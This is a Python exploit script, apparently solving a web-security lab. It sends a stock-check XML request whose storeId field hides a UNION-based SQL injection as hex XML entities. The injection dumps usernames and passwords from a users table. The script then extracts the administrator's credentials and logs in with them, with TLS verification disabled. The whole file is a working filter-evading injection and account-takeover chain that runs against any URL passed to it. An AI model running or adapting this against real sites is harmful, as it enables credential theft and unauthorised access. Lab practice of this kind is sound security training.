import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}


def getCSRF(r):
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def login(username, password, url):
    uri = '/login'
    fullurl = url + uri
    s = requests.Session()
    r = s.get(fullurl, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    t = s.post(fullurl, verify=False, proxies=proxies, data=data)
    if 'Log out' in t.text:
        print('\n Login Bypassed')

    else :
        print('\n Log In bypassed failed')

def XMLencoding(url):
    uri = '/product/stock'
    fullurl = url + uri
    xmlpayload = """<?xml version="1.0" encoding="UTF-8"?>
                      <stockCheck>
                        <productId>
                          2
                        </productId>
                        <storeId>
                          &#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#xd;&#xa;
                        </storeId>
                      </stockCheck>"""



    r = requests.post(fullurl,verify=False,proxies=proxies,data=xmlpayload)
    list_p =[]
    list_d = []
    username = ''
    password = ''
    list_p = r.text.split()
    for i in range(len(list_p)):
        item = list_p[i]
        if 'administrator' in item:
            list_d = item.split('~')
            username = list_d[0]
            password = list_d[1]

    login(username,password,url)




if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage python3 %s <url>' %sys.argv[0])
        print('[-] Example python3 %s example.com' %sys.argv[0])

    XMLencoding(url)
